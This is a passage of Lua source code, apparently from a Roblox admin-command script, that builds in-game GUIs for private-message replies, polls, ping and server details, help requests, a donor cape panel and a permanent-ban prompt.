l.Font=set.Font
l.Text=from
l.TextColor3=set['TextColor']
l.TextScaled=true
l.TextStrokeTransparency=1--set.TextStrokeTransparency
l.TextStrokeColor3=set['TextStrokeColor']
m.BackgroundTransparency=0.5
m.BackgroundColor3=set['PrimaryColor']
m.BorderSizePixel=0
m.Position=UDim2.new(0,0,0,35)
m.Size=UDim2.new(0,300,0,100)
m.Font=set.Font
m.Text=message
m.TextColor3=set['TextColor']
m.TextScaled=true
m.TextStrokeTransparency=set.TextStrokeTransparency
m.TextStrokeColor3=set['TextStrokeColor']
tb.BackgroundTransparency=0.5
tb.BackgroundColor3=set['PrimaryColor']
tb.BorderSizePixel=0
tb.Position=UDim2.new(0,0,1,-63)
tb.Size=UDim2.new(0,300,0,25)
tb.Font=set.Font
tb.Text='Enter Text Here Then Click Reply'
tb.TextColor3=set['TextColor']
tb.TextScaled=true
tb.TextStrokeTransparency=set.TextStrokeTransparency
tb.TextStrokeColor3=set['TextStrokeColor']
b.BackgroundColor3=set.PrimaryColor
b.BorderColor3=set['PrimaryColor']
b.BackgroundTransparency=set['Transparency']
b.Position=UDim2.new(0,50,0,143)
b.Size=UDim2.new(0,200,0,50)
if player then
b.Position=UDim2.new(0,10,1,-30)
b.Size=UDim2.new(0,100,0,20)
end
b.Font=set.Font
b.Text='Close'
b.TextColor3=set['TextColor']
b.TextStrokeTransparency=set.TextStrokeTransparency
b.TextStrokeColor3=set['TextStrokeColor']
b.TextScaled=true
b.MouseButton1Click:connect(function() g:Destroy() end)
reply.BackgroundColor3=set.PrimaryColor
reply.BorderColor3=set['PrimaryColor']
reply.BackgroundTransparency=set['Transparency']
reply.Position=UDim2.new(1,-110,1,-30)
reply.Size=UDim2.new(0,100,0,20)
reply.Font=set.Font
reply.Text='Reply'
reply.TextColor3=set['TextColor']
reply.TextStrokeTransparency=set.TextStrokeTransparency
reply.TextStrokeColor3=set['TextStrokeColor']
reply.TextScaled=true
reply.MouseButton1Click:connect(function()
	if tb.Text~='Enter Text Here Then Click Reply' and #tb.Text>0 then 
		g:Destroy()
		Remote('PrivateMessage','Private Message from '..p.Name,player,tb.Text,p)
	else
		tb.Text='Enter Text Here Then Click Reply'
	end
end)
end

set.VoteResults=function(question,Yes,No,idk,YesNum,NoNum,IdkNum)
local plr=localplayer
local gui=Instance.new('ScreenGui',plr.PlayerGui)
gui.Name=set.GuiName..'RESULTS'
local frame=Instance.new('Frame',gui)
frame.BackgroundColor3=set['PrimaryColor']
frame.BackgroundTransparency=set['Transparency']
frame.Position=UDim2.new(0,400,0,50)
frame.Size=UDim2.new(0,200,0,100)
frame.Draggable=true
frame.Active=true
local nyes=Instance.new('TextLabel',frame)
nyes.BackgroundTransparency=1
nyes.Position=UDim2.new(0,10,0,50)
nyes.Size=UDim2.new(0,70,0,10)
nyes.Font=set.Font
nyes.FontSize='Size14'
nyes.TextColor3=Color3.new(0,1,0)
nyes.Text='Number of Yes:'
nyes.TextScaled=true
nyes.TextWrapped=true
local nno=Instance.new('TextLabel',frame)
nno.BackgroundTransparency=1
nno.Position=UDim2.new(0,120,0,50)
nno.Size=UDim2.new(0,70,0,10)
nno.Font=set.Font
nno.FontSize='Size14'
nno.TextColor3=Color3.new(1,0,0)
nno.Text='Number of No:'
nno.TextScaled=true
nno.TextWrapped=true
local qr=Instance.new('TextLabel',frame)
qr.Position=UDim2.new(0,5,0,5)
qr.Size=UDim2.new(0,190,0,35)
qr.BackgroundTransparency=1
qr.Font=set.Font
qr.Text='Results For: '..question
qr.TextColor3=Color3.new(1,1,1)
qr.TextScaled=true
qr.TextWrapped=true
local yes=Instance.new('TextLabel',frame)
yes.BackgroundTransparency=1
yes.Position=UDim2.new(0,10,0,70)
yes.Size=UDim2.new(0,70,0,20)
yes.Font=set.Font
yes.FontSize='Size14'
yes.Text=YesNum.." | "..Yes.."%"
yes.TextColor3=Color3.new(0,1,0)
yes.TextWrapped=false
local none=Instance.new('TextLabel',frame)
none.BackgroundTransparency=1
none.Font=set.Font
none.FontSize='Size14'
none.TextColor3=Color3.new(70/255,70/255,70/255)
none.Text=IdkNum.." | "..idk.."%"
none.Position=UDim2.new(0,65,0,70)
none.Size=UDim2.new(0,70,0,20)
none.TextWrapped=false
local no=Instance.new('TextLabel',frame)
no.BackgroundTransparency=1
no.Position=UDim2.new(0,120,0,70)
no.Size=UDim2.new(0,70,0,20)
no.Font=set.Font
no.FontSize='Size14'
no.Text=NoNum.." | "..No.."%"
no.TextColor3=Color3.new(1,0,0)
no.TextWrapped=false
wait(10)
gui:remove()
end

set.VoteQuestion=function(tname,question,Time)
local guiz=Instance.new('ScreenGui') 
guiz.Name=set.GuiName..'VOTE'
guiz.Parent=playergui
local frame=Instance.new('Frame',guiz)
local yes=Instance.new('TextButton',frame)
local no=Instance.new('TextButton',frame)
local q=Instance.new('TextLabel',frame)
local t=Instance.new('TextLabel',frame)
frame.Position=UDim2.new(0,350,0,50)
frame.Size=UDim2.new(0,300,0,200)
frame.BackgroundTransparency=set['Transparency']
frame.BackgroundColor3=set['PrimaryColor']
frame.Draggable=true
frame.Active=true
yes.Position=UDim2.new(0,20,0,130)
yes.Size=UDim2.new(0,100,0,50)
yes.BackgroundColor3=Color3.new(0,85,0)
yes.Font=set.Font
yes.FontSize='Size14'
yes.Text='Yes'
yes.TextColor3=Color3.new(1,1,1)
yes.TextScaled=true
yes.TextWrapped=true
no.Position=UDim2.new(0,180,0,130)
no.Size=UDim2.new(0,100,0,50)
no.BackgroundColor3=Color3.new(170,0,0)
no.Font=set.Font
no.FontSize='Size14'
no.Text='No'
no.TextColor3=Color3.new(1,1,1)
no.TextScaled=true
no.TextWrapped=true
q.Position=UDim2.new(0,10,0,25)
q.Size=UDim2.new(0,280,0,90)
q.BackgroundTransparency=1
q.Text=question
q.Font=set.Font
q.TextColor3=set['TextColor']
q.TextWrapped=true
q.TextScaled=true
t.Position=UDim2.new(0,10,0,10)
t.Size=UDim2.new(0,280,0,10)
t.BackgroundTransparency=1
t.TextColor3=set['TextColor']
t.TextWrapped=false
t.TextScaled=false
t.Font=set.Font
t.FontSize='Size14'
t.Text='Time Left: '..tostring(Time)..' second(s)'
yes.MouseButton1Click:connect(function()
	guiz:Destroy()
	Remote('PlaceVote',tname,'yes')
end)
no.MouseButton1Click:connect(function()
	guiz:Destroy()
	Remote('PlaceVote',tname,'no')
end)
for i = 0,Time do
	t.Text = "Time left: "..Time-i.." second(s)"
	wait(1)
end 
if gui ~= nil then guiz:Destroy() end
end

set.PingGui=function()
	local plr=localplayer
	if plr.PlayerGui:FindFirstChild(set.GuiName..'PING') then plr.PlayerGui[set.GuiName..'PING']:Destroy() end
	local g=Instance.new('ScreenGui',plr.PlayerGui) g.Name=set.GuiName..'PING'
	local f=Instance.new('Frame',g)
	local button=Instance.new('TextButton',f)
	local title=Instance.new('TextLabel',f)
	local ping=Instance.new('TextLabel',f)
	f.BackgroundColor3=set['PrimaryColor']
	f.BorderSizePixel=0
	f.BackgroundTransparency=set['Transparency']
	f.Draggable=true
	f.Active=true
	f.Position=UDim2.new(0.5,-50,0,50)
	f.Size=UDim2.new(0,100,0,50)
	button.BackgroundColor3=set.PrimaryColor
	button.BorderColor3=set['PrimaryColor']
	button.BackgroundTransparency=0.5
	button.Position=UDim2.new(0,85,0,2)
	button.Size=UDim2.new(0,13,0,13)
	button.Font=set.Font
	button.Text='X'
	button.TextColor3=set.TextColor
	button.TextStrokeTransparency=set.TextStrokeTransparency
	button.TextStrokeColor3=set['TextStrokeColor']
	title.Text='Ping'
	title.Font=set.Font
	title.TextColor3=set['TextColor']
	title.TextStrokeColor3=set['TextStrokeColor']
	title.BackgroundTransparency=1
	title.Position=UDim2.new(0,5,0,0)
	title.Size=UDim2.new(0,90,0,15)
	ping.BackgroundColor3=set['PrimaryColor']
	ping.BorderSizePixel=0
	ping.BackgroundTransparency=set['Transparency']
	ping.Position=UDim2.new(0,0,0,20)
	ping.Size=UDim2.new(0,100,0,30)
	ping.Font=set.Font
	ping.TextStrokeColor3=set['TextStrokeColor']
	ping.TextStrokeTransparency=set.TextStrokeTransparency
	ping.TextColor3=set['TextColor']
	ping.Text='Sending...'
	coroutine.wrap(function()
	repeat
	ping.Text=Ping()
	wait(1)
	until not g or not g.Parent or not ping or not ping.Parent
	end)()
	ping.TextScaled=true
	ping.TextWrapped=true
	title.TextScaled=true
	title.TextWrapped=true
	button.TextScaled=true
	button.TextWrapped=true
	title.TextStrokeTransparency=set.TextStrokeTransparency
	button.MouseButton1Click:connect(function()
		pcall(function() g:Destroy() end)
	end)
end

set.RequestSolved=function(plr)
if not playergui:FindFirstChild(set.GuiName..plr.Name.."HELPGUI") then return end
local gui=playergui:FindFirstChild(set.GuiName..plr.Name.."HELPGUI")
local label=gui.Frame:FindFirstChild('Label')
local yes=gui.Frame:FindFirstChild('yes')
local no=gui.Frame:FindFirstChild('no')
wait(0.5)
if label and yes and no then
label.Text='Solved'
yes:Destroy()
no:Destroy()
label.Position=UDim2.new(0,30,0,50)
label.FontSize='Size48'
wait(2)
pcall(function() gui:Destroy() end)
end
end

set.OutputGui=function(msg)
local plr=localplayer
local scr = Instance.new("ScreenGui", plr.PlayerGui) 
scr.Name=set.GuiName..'OUTPUT'
local main = Instance.new("Frame", scr) 
main.Size = UDim2.new(1,0,1,0) 
main.BorderSizePixel = 0 
main.BackgroundTransparency = 1 
main.ZIndex = 8
local err = Instance.new("TextLabel", main)
err.Text=msg
err.BackgroundColor3 = Color3.new(0,0,0) 
err.BackgroundTransparency = .3 
err.TextScaled=true
err.TextWrapped=true
err.BorderSizePixel = 0 
err.Size = UDim2.new(1,0,0,40) 
err.Position = UDim2.new(0,0,.5,-20) 
err.ZIndex = 9 err.Font = set.Font 
err.FontSize = "Size24" 
err.TextColor3 = Color3.new(1,1,1) 
err.TextStrokeColor3 = Color3.new(1,1,1) 
err.TextStrokeTransparency = .8
wait(5)
scr:Destroy()
end

set.RemoveMessage=function()
local v=localplayer
for q,ms in pairs(v.PlayerGui:children()) do
if ms.Name == set.GuiName.."MessageGUI" then
ms:Destroy()
elseif ms.Name == set.GuiName.."HintGUI" then
ms:Destroy()
end
end
end

set.RequestHelp=function(plr)
local v=localplayer
local scr=Instance.new("ScreenGui",v.PlayerGui) 
scr.Name = set.GuiName..plr.Name.."HELPGUI"
local frame=Instance.new('Frame',scr)
local label=Instance.new('TextLabel',frame)
local yes=Instance.new('TextButton',frame)
local no=Instance.new('TextButton',frame)
frame.BackgroundColor3=set['PrimaryColor']
frame.BorderSizePixel=0
frame.BackgroundTransparency=set['Transparency']
frame.BorderSizePixel=0
frame.Position=UDim2.new(1,260,1,-150)
frame.Size=UDim2.new(0,260,0,130)
frame.ClipsDescendants=true
label.BackgroundTransparency=1
label.BorderSizePixel=0
label.Position=UDim2.new(0,30,0,8)
label.Size=UDim2.new(0,200,0,30)
label.TextColor3=set['TextColor']
label.ClipsDescendants=false
label.FontSize='Size24'
label.Font=set.Font
label.TextXAlignment='Center'
label.TextYAlignment='Center'
label.Text=plr.Name..' needs help!'
label.Name='Label'
label.TextScaled=true
label.TextWrapped=true
frame.Draggable=true
frame.Active=true
label.Draggable=false
yes.BackgroundColor3=Color3.new(0,1,0)
yes.TextColor3=set['TextColor']
yes.Text='Teleport'
yes.Font=set.Font
yes.FontSize='Size24'
yes.BorderSizePixel=0
yes.TextStrokeTransparency=set.TextStrokeTransparency
yes.Name='yes'
no.Font=set.Font
no.FontSize='Size36'
no.BorderSizePixel=0
no.BackgroundColor3=Color3.new(1, 0, 0)
no.TextColor3=set['TextColor']
no.Text='Busy'
no.Name='no'
no.TextStrokeTransparency=set.TextStrokeTransparency
yes.Size=UDim2.new(0,100,0,50)
yes.Position=UDim2.new(0,20,0,50)
no.Size=UDim2.new(0,100,0,50)
no.Position=UDim2.new(0,140,0,50)
yes.MouseButton1Down:connect(function() 
Remote('HelpRespond',plr.Name,true)
scr:Destroy()
pcall(function()
if v.Character.Humanoid.Sit==true then
v.Character.Humanoid.Sit=false
wait(0.5)
end
v.Character.Torso.CFrame = plr.Character.Torso.CFrame + Vector3.new(math.random(-1,1),0,math.random(-1,1))
end)
end)
no.MouseButton1Down:connect(function() 
Remote('HelpRespond',plr.Name,false)
scr:Destroy()
end)
wait()
if set.Animations then
	frame:TweenPosition(UDim2.new(1,-280,1,-150),'Out','Elastic',1)
else
	frame.Position=UDim2.new(1,-280,1,-150)
end
for i=0,20 do
	wait(1)
end
label.Text='Timed Out'
yes:Destroy()
no:Destroy()
label.Position=UDim2.new(0,30,0,50)
label.FontSize='Size48'
wait(2)
pcall(function() scr:Destroy() end)
end

set.ServerDetails=function()
Remote('GetServerInfo')
repeat wait() until set.ServerInfo.Cameras
local plr=localplayer
if plr.PlayerGui:findFirstChild(set.GuiName.."DETAILSGUI") then return end
local scr, cmf, ent, num, top, main, point = set.MainScrollGui() scr.Name = set.GuiName.."DETAILSGUI" scr.Parent = plr.PlayerGui
top.Text='Information'
local cl = ent:Clone() 
cl.Parent = cmf
Expand(cl,point,cmf,main) 
cl.Desc.Value='Creator of this place'
cl.Text = 'Owner: '..set.ServerInfo.PlaceOwner
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1 
local cl = ent:Clone() 
cl.Parent = cmf
cl.Text = 'Place: '..set.ServerInfo.PlaceName
Expand(cl,point,cmf,main) 
cl.Desc.Value='Name of this place'
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1 
local cl = ent:Clone() 
cl.Parent = cmf
cl.Text = 'Players: '..#game:service('Players'):children()
Expand(cl,point,cmf,main) 
cl.Desc.Value='Amount of players currently in the server'
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1 
local cl = ent:Clone() 
cl.Parent = cmf
cl.Text = 'Nil Players: '..set.ServerInfo.NilPlayers
Expand(cl,point,cmf,main) 
cl.Desc.Value='Amount of nil players currently in the server'
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1 
local cl = ent:Clone() 
cl.Parent = cmf 
coroutine.wrap(function()
repeat
cl.Text='Client FPS: '..Round(workspace:GetRealPhysicsFPS())
wait(1)
until cl.Parent==nil
end)()
Expand(cl,point,cmf,main) 
cl.Desc.Value='Your client\'s frames per second at the time the :details command was ran'
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1 
local cl = ent:Clone() 
cl.Parent = cmf 
cl.Text='Server Speed: '..set.ServerInfo.ServerSpeed
Expand(cl,point,cmf,main) 
cl.Desc.Value='Server speed at the time the :details commands was ran'
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1 
local cl = ent:Clone() 
cl.Parent = cmf 
cl.Text='Your Ping: '..Ping()..'s'
Expand(cl,point,cmf,main) 
cl.Desc.Value='Your ping at the time the :details command was ran'
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1
local cl = ent:Clone() 
cl.Parent = cmf 
cl.Text='Workspace objects: '..#workspace:children()
Expand(cl,point,cmf,main) 
cl.Desc.Value='Amount of objects in workspace when command was ran'
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1 
local cl = ent:Clone() 
cl.Parent = cmf 
cl.Text='Owner Id: '..game.CreatorId
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1 
local cl = ent:Clone() 
cl.Parent = cmf 
cl.Text='Place Id: '.. game.PlaceId
Expand(cl,point,cmf,main) 
cl.Desc.Value='This place\'s ID'
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1 
local cl = ent:Clone() 
cl.Parent = cmf 
cl.Text='Place version: '..game.PlaceVersion
Expand(cl,point,cmf,main) 
cl.Desc.Value='Current version of this place'
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1 
local cl = ent:Clone() 
cl.Parent = cmf 
cl.Text='Script version: '..set.ServerInfo.AdminVersion 
Expand(cl,point,cmf,main) 
cl.Desc.Value='Version of the script in this place'
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1 
local cl = ent:Clone() 
cl.Parent = cmf 
cl.Text='Server Start Time: '..set.ServerInfo.ServerStartTime
Expand(cl,point,cmf,main) 
cl.Desc.Value='Time when the server started'
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1
local cl = ent:Clone() 
cl.Parent = cmf 
cl.Text='Server Time: '..set.ServerInfo.CurrentTime
Expand(cl,point,cmf,main) 
cl.Desc.Value='Server time at the time the command was ran'
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1  
local cl = ent:Clone() 
cl.Parent = cmf 
coroutine.wrap(function()
repeat
cl.Text='Local Time: '..GetTime()
wait(1)
until cl.Parent==nil
end)()
Expand(cl,point,cmf,main) 
cl.Desc.Value='Your current time'
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1 
local cl = ent:Clone() 
cl.Parent = cmf 
coroutine.wrap(function()
repeat
cl.Text='TimeOfDay: '..game:service('Lighting').TimeOfDay
wait(1)
until cl.Parent==nil
end)()
Expand(cl,point,cmf,main) 
cl.Desc.Value='Current Lighting TimeOfDay'
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1 
local cl = ent:Clone() 
cl.Parent = cmf 
cl.Text='Non-Admins In-Game: '..set.ServerInfo.NonAdmins
Expand(cl,point,cmf,main) 
cl.Desc.Value='Non-Admins in-game when the command was ran'
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1 
local cl = ent:Clone() 
cl.Parent = cmf 
cl.Text='Admins In-Game: '..set.ServerInfo.Admins
Expand(cl,point,cmf,main) 
cl.Desc.Value='Admins in-game when the command was ran'
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1 
local cl = ent:Clone() 
cl.Parent = cmf 
cl.Text='Admin objects: '..set.ServerInfo.Objects 
Expand(cl,point,cmf,main) 
cl.Desc.Value='Number of admin objects at the time the command was ran'
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1 
local cl = ent:Clone() 
cl.Parent = cmf 
cl.Text='Admin cameras: '..set.ServerInfo.Cameras
Expand(cl,point,cmf,main) 
cl.Desc.Value='Number of cameras when the command was ran' 
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1
local cl = ent:Clone() 
cl.Parent = cmf 
cl.Text='Http: '..set.ServerInfo.Http 
Expand(cl,point,cmf,main) 
cl.Desc.Value='Shows if HttpEnabled is enabled or disabled'
cl.Position = UDim2.new(0,0,0,num*20)
--cl.Size=UDim2.new(0,370,0,20)
cl.TextScaled=true
cl.FontSize='Size24'
cl.Font=set.Font
num = num +1    
cmf.CanvasSize=UDim2.new(0,0,(num+1)/20,0)
end

set.Donate=function(level)
local plr=localplayer
if plr.PlayerGui:FindFirstChild(set.GuiName..'DONATIONGUI') then plr.PlayerGui[set.GuiName..'DONATIONGUI']:Destroy() end
local g=Instance.new('ScreenGui',plr.PlayerGui) g.Name=set.GuiName..'DONATIONGUI'
local f=Instance.new('Frame',g)
local DBrb=Instance.new('TextButton',f)
local DBtix=Instance.new('TextButton',f)
local title=Instance.new('TextLabel',f)
local desc=Instance.new('TextLabel',f)
local close=Instance.new('TextButton',f)
local ccbutton=Instance.new('TextButton',f)
local ccbox=Instance.new('TextBox',f)
local matbut=Instance.new('TextButton',f)
matbut.Size=UDim2.new(0,15,0,15)
matbut.BackgroundTransparency=set.Transparency
matbut.BorderSizePixel=0
matbut.BackgroundColor3=set.PrimaryColor
matbut.TextScaled=true
--matbut.BorderSizePixel=0
matbut.Position=UDim2.new(0,2,0,2)
matbut.Visible=false
matbut.Text='M'
matbut.ZIndex=10
matbut.TextColor3=set.TextColor
matbut.MouseButton1Click:connect(function()
	set.Materials={'Brick';'Cobblestone';'Concrete';'CorrodedMetal';'DiamondPlate';'Fabric';'Foil';'Granite';'Grass';'Ice';'Marble';'Metal';'Pebble';'Plastic';'Sand';'Slate';'SmoothPlastic';'Wood';'WoodPlanks'}
	set.ListGui('Materials','Materials')
end)
local togbut=matbut:clone()
togbut.Parent=f
togbut.Size=UDim2.new(0,30,0,15)
togbut.Position=UDim2.new(0,20,0,2)
Remote('CheckCape')
wait(0.5)
if set.UsingCape then
	togbut.Text='On'
else
	togbut.Text='Off'
end
togbut.MouseButton1Click:connect(function()
	if togbut.Text=='On' then
		togbut.Text='Off'
		Remote('ToggleDonor',false)
	else
		togbut.Text='On'
		Remote('ToggleDonor',true)
	end
end)
ccbutton.BackgroundColor3=Color3.new(1,1,1)
ccbutton.BackgroundTransparency=0.5
ccbutton.BorderColor3=Color3.new(0,0,0)
ccbutton.BorderSizePixel=0
ccbutton.Position=UDim2.new(0,230,0,20)
ccbutton.Size=UDim2.new(0,40,0,25)
ccbutton.Font=set.Font
ccbutton.Text='Get'
ccbutton.TextColor3=Color3.new(1,1,1)
ccbutton.TextStrokeTransparency=set.TextStrokeTransparency
ccbutton.Visible=false
ccbutton.TextScaled=true
ccbox.BackgroundColor3=Color3.new(1,1,1)
ccbox.BorderColor3=Color3.new(0,0,0)
ccbox.BorderSizePixel=0
ccbox.BackgroundTransparency=0.5
ccbox.Position=UDim2.new(0,25,0,20)
ccbox.Size=UDim2.new(0,60,0,25)
ccbox.Font=set.Font
ccbox.TextColor3=Color3.new(1,1,1)
ccbox.TextStrokeTransparency=set.TextStrokeTransparency
ccbox.TextScaled=true
ccbox.Visible=false
ccbox.Text='TEXTUREID'
ccb2=ccbox:clone()
ccb3=ccbox:clone()
ccb2.Parent=f
ccb3.Parent=f
ccb2.Position=UDim2.new(0,90,0,20)
ccb3.Position=UDim2.new(0,155,0,20)
ccb2.Text='BRICKCOLOR'
ccb3.Text='MATERIAL'
f.BackgroundColor3=Color3.new(0,0,0)
f.BorderColor3=Color3.new(1,1,1)
f.BorderSizePixel=0
f.BackgroundTransparency=0.5
f.Position=UDim2.new(0.5,-150,0,-150)
f.Size=UDim2.new(0,300,0,150)
f.Draggable=true
f.Active=true
DBrb.BackgroundColor3=Color3.new(0,170/255,0)
DBrb.BorderColor3=Color3.new(0,0,0)
DBrb.BorderSizePixel=0
DBrb.BackgroundTransparency=0.5
DBrb.Position=UDim2.new(0,10,0,30)
DBrb.Size=UDim2.new(0,130,0,50)
DBrb.TextColor3=Color3.new(1,1,1)
DBrb.TextStrokeTransparency=set.TextStrokeTransparency
DBrb.TextWrapped=true
DBrb.TextScaled=true
DBrb.Visible=false
DBrb.Font=set.Font
DBtix.BackgroundColor3=Color3.new(1,1,0)
DBtix.BorderSizePixel=0
DBtix.BorderColor3=Color3.new(0,0,0)
DBtix.BackgroundTransparency=0.5
DBtix.Position=UDim2.new(0,160,0,30)
DBtix.Size=UDim2.new(0,130,0,50)
DBtix.TextColor3=Color3.new(1,1,1)
DBtix.TextStrokeTransparency=set.TextStrokeTransparency
DBtix.TextWrapped=true
DBtix.TextScaled=true
DBtix.Font=set.Font
DBtix.Visible=false
close.BackgroundColor3=set.PrimaryColor--Color3.new(1,1,1)
close.BorderColor3=Color3.new(0,0,0)
close.BorderSizePixel=0
close.BackgroundTransparency=0.5
close.TextColor3=set.TextColor--Color3.new(1,1,1)
close.TextStrokeTransparency=set.TextStrokeTransparency
close.TextScaled=true
close.TextWrapped=true
close.Position=UDim2.new(1,-23,0,3)
close.Size=UDim2.new(0,20,0,20)
close.Font=set.Font
close.Text='X'
close.MouseButton1Click:connect(function() g:Destroy() end)
title.BackgroundTransparency=1
title.Size=UDim2.new(0,300,0,15)
title.Text='Donate'
title.TextColor3=set.TextColor--Color3.new(1,1,1)
title.TextStrokeColor3=set.TextStrokeColor--Color3.new(0,0,0)
title.TextStrokeTransparency=set.TextStrokeTransparency
title.TextWrapped=true
title.TextScaled=true
title.Font=set.Font
desc.BackgroundColor3=Color3.new(0,0,0)
desc.BorderColor3=Color3.new(1,1,1)
desc.BorderSizePixel=0
desc.BackgroundTransparency=1--0.5
desc.Position=UDim2.new(0,2,0,90)
desc.Size=UDim2.new(1,-4,0,60)
desc.Font=set.Font
desc.TextColor3=set.TextColor--Color3.new(1,1,1)
desc.TextStrokeColor3=Color3.new(0,0,0)
desc.TextStrokeTransparency=set.TextStrokeTransparency
desc.TextScaled=true
desc.TextWrapped=true
if level==2 then--set.ChkDonor(plr) and set.ChkCustomPass(plr) then
	DBrb.Visible=false
	DBtix.Visible=false
	desc.Text='Make a custom cape and upload it as a decal (12 inches high 6 inches wide or it will look strange). The Texture Id is the id of the decals texture (id is usually decal id minus 1 or 2, if decalid=1234567 then textureid usually=1234566 or 1234565. Material is optional (what its made of). Format: 1284551;Bright red;Fabric'
	desc.Size=UDim2.new(0,300,0,100)
	desc.Position=UDim2.new(0,0,0,50)
	ccbutton.Visible=true
	ccbox.Visible=true
	ccb2.Visible=true
	ccb3.Visible=true
	matbut.Visible=true
	togbut.Visible=true
	ccbutton.MouseButton1Click:connect(function()
		local one,two,three
		if ccbox.Text=='TEXTUREID' then
			one=0
		else
			one=ccbox.Text
		end
		if ccb2.Text=='BRICKCOLOR' then
			two='White'
		else
			two=ccb2.Text
		end
		if ccb3.Text=='MATERIAL' then
			three='Plastic'
		else
			three=ccb3.Text
		end
		Remote('SetCape',one..';'..two..';'..three)
		ccbox.Text='TEXTUREID'
		ccb2.Text='BRICK COLOR'
		ccb3.Text='MATERIAL'
		togbut.Text='On'
	end)
elseif level==1 then
DBrb.Visible=true
DBtix.Visible=true
DBrb.Text='Donor Cape & Bongos [RB]'
DBtix.Text='Donor Cape & Bongos [TIX]'
desc.Text='Gives you a cape and bongos, to change your cape at any time after donating simply say !donate or !change in-game. Say :cmds to view commands you can do, after donating you will have access to some extra donor commands.'
DBrb.MouseButton1Click:connect(function()
	game:GetService("MarketplaceService"):PromptPurchase(plr,set.donorgamepass[#set.donorgamepass],false,Enum.CurrencyType.Robux)
end)
DBtix.MouseButton1Click:connect(function()
	game:GetService("MarketplaceService"):PromptPurchase(plr,set.donorgamepass[#set.donorgamepass],false,Enum.CurrencyType.Tix)
end)
end
wait()
if set.Animations then
	f:TweenPosition(UDim2.new(0.5,-150,0.5,-75),'Out','Elastic',1)
else
	f.Position=UDim2.new(0.5,-150,0.5,-75)
end
end

set.PromptPermBan=function(v)
local plr=localplayer
if v and not ChkAdmin(v.Name, false) then 
local scr=Instance.new("ScreenGui",plr.PlayerGui) 
scr.Name = set.GuiName.."PERMBANGUI"
local frame=Instance.new('Frame',scr)
local label=Instance.new('TextLabel',frame)
local yes=Instance.new('TextButton',frame)
local no=Instance.new('TextButton',frame)
frame.BackgroundColor3=set['PrimaryColor']
frame.BorderColor3=Color3.new(1,1,1)
frame.BackgroundTransparency=set['Transparency']
frame.BorderSizePixel=0
frame.Position=UDim2.new(1,260,1,-150)
frame.Size=UDim2.new(0,260,0,130)
frame.ClipsDescendants=true
label.BackgroundTransparency=1
label.BorderSizePixel=0
label.Position=UDim2.new(0,5,0,8)
label.Size=UDim2.new(0,250,0,30)
label.TextColor3=set['TextColor']
label.ClipsDescendants=false
label.TextWrapped=true
label.TextScaled=true
label.FontSize='Size14'
label.Font=set.Font
label.TextXAlignment='Center'
label.TextYAlignment='Center'
label.Text='Permanently ban '..v.Name..'?'
frame.Draggable=true
frame.Active=true
label.Draggable=false
yes.BackgroundColor3=Color3.new(0, 170, 0)
yes.TextColor3=Color3.new(1,1,1)
yes.Text='Yes'
yes.Font=set.Font
yes.FontSize='Size36'
no.Font=set.Font
no.FontSize='Size36'
no.BackgroundColor3=Color3.new(170, 0, 0)
no.TextColor3=Color3.new(1,1,1)
no.Text='No'
yes.Size=UDim2.new(0,100,0,50)
yes.Position=UDim2.new(0,20,0,50)
no.Size=UDim2.new(0,100,0,50)
